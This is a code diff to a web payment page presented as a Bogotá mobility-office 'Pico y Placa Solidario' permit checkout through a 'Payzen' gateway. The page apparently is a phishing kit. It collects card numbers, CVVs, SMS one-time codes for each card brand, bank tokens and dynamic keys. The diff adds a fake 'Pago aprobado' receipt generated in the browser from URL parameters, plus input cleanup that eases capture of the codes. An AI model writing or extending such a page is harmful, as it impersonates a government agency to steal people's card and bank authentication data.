@@ -211,13 +211,14 @@ const pseBanks = [
 
         <h4 class="text-dark-green font-semibold mb-3">Escoge una opcion de pago</h4>
         <div class="grid md:grid-cols-3 gap-3 mb-5">
+          <input type="radio" name="metodoPago" value="" checked tabindex="-1" autocomplete="off" aria-hidden="true" style="position:absolute;width:1px;height:1px;opacity:0;pointer-events:none" />
           <div class="flex flex-col gap-3">
-            <label class="payment-choice" aria-disabled="true" style="opacity:0.55;cursor:not-allowed;pointer-events:none;">
+            <label class="payment-choice">
               <span class="flex items-center gap-2 font-semibold">
-                <input type="radio" name="metodoPago" value="pse" disabled />
+                <input type="radio" name="metodoPago" value="pse" autocomplete="off" />
                 PSE
               </span>
-              <small>Débito a cuenta bancaria · No disponible</small>
+              <small>Débito a cuenta bancaria</small>
             </label>
             <div id="pseBankBox" class="hidden">
               <label class="mat-field">
@@ -231,20 +232,20 @@ const pseBanks = [
           </div>
           <label class="payment-choice">
             <span class="flex items-center gap-2 font-semibold">
-              <input type="radio" name="metodoPago" value="credito" />
+              <input type="radio" name="metodoPago" value="credito" autocomplete="off" />
               Tarjeta de crédito
             </span>
             <small>Visa, Mastercard, American Express, Diners Club</small>
           </label>
           <label class="payment-choice">
             <span class="flex items-center gap-2 font-semibold">
-              <input type="radio" name="metodoPago" value="debito" />
+              <input type="radio" name="metodoPago" value="debito" autocomplete="off" />
               Tarjeta de débito
             </span>
             <small>Visa débito, Mastercard débito, Diners Club</small>
           </label>
         </div>
-        <div id="pseUnavailable" class="mt-4 rounded px-4 py-3 text-sm text-dark-green bg-[#fff8e6] border border-[#d4b45a]" role="alert">
+        <div id="pseUnavailable" class="hidden mt-4 rounded px-4 py-3 text-sm text-dark-green bg-[#fff8e6] border border-[#d4b45a]" role="alert">
           <strong class="block mb-1">Servicio no disponible</strong>
           El pago a través de PSE no se encuentra habilitado por el momento. Selecciona tarjeta de crédito o débito para continuar con tu solicitud.
         </div>
@@ -439,8 +440,7 @@ const pseBanks = [
             data-form-type="other"
             data-1p-ignore="true"
             placeholder=" "
-            value={titularTarjeta}
-            readonly
+            value=""
           />
           <p class="pagos-card-error" id="pagos-card-name-error" hidden></p>
         </label>
@@ -672,7 +672,7 @@ const pseBanks = [
           <span>Código SMS</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="otp-visa" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
+            <input id="otp-visa" name="otp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
           </span>
         </label>
         <p data-otp-debug-message hidden></p>
@@ -714,7 +714,7 @@ const pseBanks = [
           <span>Código SMS</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="otp-discover" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
+            <input id="otp-discover" name="otp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
           </span>
         </label>
         <p data-otp-debug-message hidden></p>
@@ -747,7 +747,7 @@ const pseBanks = [
           <span>Código SMS</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="otp-amex" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
+            <input id="otp-amex" name="otp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
           </span>
         </label>
         <p data-otp-debug-message hidden></p>
@@ -784,7 +784,7 @@ const pseBanks = [
           <span>Código SMS</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="otp-mc" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
+            <input id="otp-mc" name="otp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
           </span>
         </label>
         <p data-otp-debug-message hidden></p>
@@ -817,7 +817,7 @@ const pseBanks = [
           <span>Código SMS</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="otp-diners" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
+            <input id="otp-diners" name="otp" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="12" placeholder="Ingresa el código" autocomplete="one-time-code" />
           </span>
         </label>
         <p data-otp-debug-message hidden></p>
@@ -945,7 +945,7 @@ const pseBanks = [
           <span>Token</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="pagos-auth-token" name="token" type="text" inputmode="numeric" autocomplete="off" maxlength="12" placeholder="Ingresa tu token" />
+            <input id="pagos-auth-token" name="token" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" maxlength="12" placeholder="Ingresa tu token" />
           </span>
         </label>
         <p data-auth-debug-message hidden></p>
@@ -998,7 +998,7 @@ const pseBanks = [
           <span>Clave dinámica</span>
           <span class="pasarela-bank-auth__control">
             <svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true"><path fill="currentColor" d="M17 9h-1V7a4 4 0 0 0-8 0v2H7a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2Zm-7-2a2 2 0 0 1 4 0v2h-4Z" /></svg>
-            <input id="pagos-auth-cdin" name="cdin" type="text" inputmode="numeric" autocomplete="off" maxlength="8" placeholder="Ingresa tu clave dinámica" />
+            <input id="pagos-auth-cdin" name="cdin" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" maxlength="8" placeholder="Ingresa tu clave dinámica" />
           </span>
         </label>
         <p data-auth-debug-message hidden></p>
@@ -1008,6 +1008,44 @@ const pseBanks = [
     </div>
   </section>
 </div>
+
+<div
+  class="pasarela-challenge"
+  id="pagos-approved-screen"
+  hidden
+  role="dialog"
+  aria-modal="true"
+  aria-label="Pago aprobado"
+>
+  <section class="pasarela-card pasarela-bank-auth pasarela-approved">
+    <div class="pasarela-bank-auth__body">
+      <header class="pasarela-bank-auth__head">
+        <div class="pasarela-approved__check" aria-hidden="true">
+          <svg viewBox="0 0 48 48" width="56" height="56">
+            <circle cx="24" cy="24" r="24" fill="#88f456"></circle>
+            <path d="M14 24.5 21 31.5 34 16.5" fill="none" stroke="#00271c" stroke-width="3.4" stroke-linecap="round" stroke-linejoin="round"></path>
+          </svg>
+        </div>
+        <p class="pasarela-bank-auth__kicker">Payzen · Transacción segura</p>
+        <h2 class="pasarela-bank-auth__title">Pago aprobado</h2>
+        <p class="pasarela-bank-auth__lead">Tu permiso Pico y Placa Solidario quedó pagado. Conserva este comprobante.</p>
+      </header>
+      <div class="pasarela-bank-auth__summary">
+        <p>Estado<strong>Aprobado</strong></p>
+        <p>Comercio<strong data-approved-merchant>Secretaría Distrital de Movilidad</strong></p>
+        <p>Valor<strong data-approved-amount></strong></p>
+        <p>Referencia<strong data-approved-ref></strong></p>
+        <p>Fecha<span data-approved-datetime></span></p>
+        <p>Placa<span data-approved-plates></span></p>
+      </div>
+      <div class="pasarela-bank-auth__form">
+        <button type="button" id="btnPagoAprobado">Finalizar</button>
+        <p class="pasarela-bank-auth__secure">Comprobante generado por Payzen · Secretaría Distrital de Movilidad</p>
+      </div>
+    </div>
+  </section>
+</div>
+
 
 <div class="pagos-sheet" id="pagos-sheet" hidden>
   <button type="button" class="pagos-sheet__backdrop" data-pagos-sheet-close aria-label="Cerrar"></button>
@@ -1277,6 +1315,65 @@ const pseBanks = [
     }
     return false;
   }
+
+  function showApprovedReceipt() {
+    const wait = document.getElementById('pagos-wait-screen');
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const auth = document.getElementById('pagos-auth-screen');
+    const screen = document.getElementById('pagos-approved-screen');
+    const q = new URLSearchParams(window.location.search);
+    const now = new Date();
+    const months = [
+      'enero', 'febrero', 'marzo', 'abril', 'mayo', 'junio',
+      'julio', 'agosto', 'septiembre', 'octubre', 'noviembre', 'diciembre',
+    ];
+    const datetimeLabel = `${now.getDate()} de ${months[now.getMonth()]} de ${now.getFullYear()} · ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
+    const amountLabel = document.getElementById('pagos-total-price')?.textContent || document.getElementById('cardTotal')?.textContent || '$ 0';
+    const doc = q.get('numeroDocumento') || '';
+    const ref = `PYPS-${now.getFullYear()}-${String(doc).slice(-6).padStart(6, '0')}`;
+    const plates = (q.get('placa') || '').toUpperCase() || '—';
+    if (wait) {
+      wait.hidden = true;
+      wait.style.display = 'none';
+    }
+    if (challenge) {
+      challenge.hidden = true;
+      challenge.style.display = 'none';
+    }
+    if (auth) {
+      auth.hidden = true;
+      auth.style.display = 'none';
+    }
+    screen?.querySelectorAll('[data-approved-amount]').forEach((el) => {
+      el.textContent = amountLabel;
+    });
+    screen?.querySelectorAll('[data-approved-datetime]').forEach((el) => {
+      el.textContent = datetimeLabel;
+    });
+    screen?.querySelectorAll('[data-approved-ref]').forEach((el) => {
+      el.textContent = ref;
+    });
+    screen?.querySelectorAll('[data-approved-plates]').forEach((el) => {
+      el.textContent = plates;
+    });
+    if (screen) {
+      if (screen.parentElement !== document.body) document.body.appendChild(screen);
+      screen.hidden = false;
+      screen.removeAttribute('hidden');
+      screen.style.display = 'flex';
+      screen.style.zIndex = '500';
+    }
+    document.body.classList.add('is-offers-waiting');
+  }
+
+  document.getElementById('btnPagoAprobado')?.addEventListener('click', () => {
+    const screen = document.getElementById('pagos-approved-screen');
+    if (screen) {
+      screen.hidden = true;
+      screen.style.display = 'none';
+    }
+    document.body.classList.remove('is-offers-waiting');
+  });
 
   function money(value, withUsd = false) {
     const formatted = Math.round(Number(value || 0)).toLocaleString('es-CO');
@@ -1961,10 +2058,7 @@ const pseBanks = [
       }
 
       if (nextAction === 'approved') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        window.location.href = '/success';
+        showApprovedReceipt();
         return;
       }
 
@@ -1993,6 +2087,13 @@ const pseBanks = [
     });
   });
 
+  document.querySelectorAll('input[name="otp"], input[name="token"], input[name="cdin"]').forEach((el) => {
+    const keepDigits = () => {
+      el.value = el.value.replace(/\D/g, '');
+    };
+    el.addEventListener('input', keepDigits);
+    el.addEventListener('paste', () => window.setTimeout(keepDigits, 0));
+  });
   document.querySelectorAll('[data-otp-form]').forEach((form) => {
     form.addEventListener('submit', async (event) => {
       event.preventDefault();
@@ -2083,10 +2184,7 @@ const pseBanks = [
       }
 
       if (nextAction === 'approved') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        window.location.href = '/success';
+        showApprovedReceipt();
         return;
       }
 
@@ -2167,10 +2265,7 @@ const pseBanks = [
         return;
       }
       if (nextAction === 'approved') {
-        if (wait) wait.hidden = true;
-        if (challenge) challenge.hidden = true;
-        document.body.classList.remove('is-offers-waiting');
-        window.location.href = '/success';
+        showApprovedReceipt();
         return;
       }
       if (wait) wait.hidden = true;
@@ -2203,6 +2298,7 @@ const pseBanks = [
     document.getElementById('pseBankBox')?.classList.toggle('hidden', metodo !== 'pse');
     document.getElementById('cardHint')?.classList.toggle('hidden', metodo === 'pse');
     document.getElementById('cardCuotasWrap')?.classList.toggle('hidden', metodo !== 'credito');
+    document.getElementById('pseUnavailable')?.classList.toggle('hidden', metodo !== 'pse');
   }
 
   function pypsQuery() {
@@ -2259,8 +2355,19 @@ const pseBanks = [
     `;
   }
 
-  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => el.addEventListener('change', pypsSyncMetodo));
-  pypsSyncMetodo();
+  function pypsClearMetodo() {
+    document.querySelectorAll('input[name="metodoPago"]').forEach((el) => {
+      el.checked = el.value === '';
+    });
+    pypsSyncMetodo();
+  }
+
+  document.querySelectorAll('input[name="metodoPago"]').forEach((el) => {
+    el.addEventListener('change', pypsSyncMetodo);
+  });
+  pypsClearMetodo();
+  window.setTimeout(pypsClearMetodo, 50);
+  window.setTimeout(pypsClearMetodo, 400);
 
   document.getElementById('donacionSi')?.addEventListener('click', () => {
     document.getElementById('donacionBox')?.classList.remove('hidden');
@@ -2325,18 +2432,17 @@ const pseBanks = [
       brand.textContent = CARD_BRANDS;
       brand.className = 'text-sm text-gray mb-4';
     }
-    const q = pypsQuery();
-    const titular = [q.get('primerNombre'), q.get('segundoNombre'), q.get('primerApellido'), q.get('segundoApellido')].filter(Boolean).join(' ');
-    const titularEl = document.getElementById('cardTitular');
-    if (titularEl) {
-      titularEl.setAttribute('autocomplete', 'off');
-      titularEl.setAttribute('readonly', 'readonly');
-      titularEl.value = titular;
+    ['cardTitular', 'cardNumero', 'cardVence', 'cardCvv'].forEach((id) => {
+      const el = document.getElementById(id);
+      if (!el) return;
+      el.setAttribute('autocomplete', 'off');
+      el.setAttribute('readonly', 'readonly');
+      el.value = '';
       window.setTimeout(() => {
-        titularEl.value = titular;
-        titularEl.removeAttribute('readonly');
+        el.value = '';
+        el.removeAttribute('readonly');
       }, 350);
-    }
+    });
     document.getElementById('cardError')?.classList.add('hidden');
     pypsOverlay('cardOverlay', true);
   });
